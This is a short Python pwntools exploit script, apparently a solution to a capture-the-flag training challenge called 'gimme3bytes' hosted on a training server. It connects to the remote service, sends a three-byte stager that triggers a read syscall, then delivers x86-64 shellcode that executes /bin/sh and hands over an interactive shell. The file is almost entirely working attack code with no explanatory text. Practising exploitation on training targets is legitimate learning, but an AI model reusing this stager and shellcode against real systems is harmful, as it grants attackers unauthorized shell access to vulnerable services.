import pwn

pwn.context.terminal = ['gnome-terminal', '-e']
pwn.context.arch = 'amd64'

r = pwn.remote("training.jinblack.it", 2004)

# r = pwn.process('./gimme3bytes')

# pwn.gdb.attach(r, """c

# """)

input('wait')

load_shell_code = pwn.asm('''
    pop rdx
    syscall
''')

shell_code = pwn.asm('''
    jmp end
    start:
    pop rdi
    mov rax, 0x3b
    lea rsi, [rdi + 0x7]
    mov rdx, rsi
    syscall
    end:
    call start
''') + b'/bin/sh' + b'\x00' * 8


r.send(load_shell_code + shell_code)

r.interactive()
